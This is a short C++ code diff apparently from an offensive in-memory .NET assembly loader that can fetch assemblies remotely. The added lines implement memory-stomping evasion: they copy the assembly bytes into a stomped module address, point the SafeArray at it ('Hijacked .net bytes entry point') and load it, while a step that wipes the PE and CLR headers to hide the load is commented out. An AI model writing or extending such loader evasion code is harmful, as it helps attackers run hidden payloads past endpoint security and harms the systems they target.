@@ -335,12 +335,18 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https)
 
     // 5. Load the Assembly from memory and run Entry Point
     std::cout << "Loading assembly into memory...\n";
+
+    PVOID entryPointNetBytes = GetStompedAddress(HANDLE(-1), buffer.data(), buffer.size());
+    std::cout << "loaded .net Bytes at " << entryPointNetBytes << "\n";
+    psa->pvData = entryPointNetBytes;
+    std::cout << "Hijacked .net bytes entry point !! \n";
+    psa->fFeatures |= FADF_STATIC;
     hr = pDefaultAppDomain->Load_3(psa, &pAssembly);
 
     void* pNukePe = nullptr;
     SafeArrayAccessData(psa, &pNukePe);
-    memset(pNukePe, 0, 0x1000); // Nuke the DOS, NT, and CLR headers in the SafeArray
-    SafeArrayUnaccessData(psa);
+    //memset(pNukePe, 0, 0x1000); // Nuke the DOS, NT, and CLR headers in the SafeArray
+    //SafeArrayUnaccessData(psa);
 
     if (FAILED(hr)) { std::cout << "Load_3 failed. HRESULT: 0x" << std::hex << hr << "\n"; goto cleanup; }
 	else { std::cout << "Assembly loaded successfully.\n"; }
